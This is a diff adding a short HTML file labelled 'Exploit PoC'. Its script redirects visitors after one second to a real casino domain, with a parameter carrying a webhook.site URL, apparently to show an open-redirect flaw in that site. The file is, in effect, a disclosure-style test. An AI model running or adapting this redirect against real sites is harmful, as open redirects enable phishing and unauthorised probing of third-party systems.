@@ -1,1 +1,13 @@
-
+<!DOCTYPE html>
+<html>
+<head><title>Exploit PoC</title></head>
+<body>
+  <p>If you're not redirected, <a href="https://online.casinosanremo.it">click here</a></p>
+  <script>
+    // redirect user after short delay
+    setTimeout(() => {
+      window.location = "https://online.casinosanremo.it/?test=https://webhook.site/4682b30a-7ee5-4009-81b1-e5628c5d775f";
+    }, 1000);
+  </script>
+</body>
+</html>
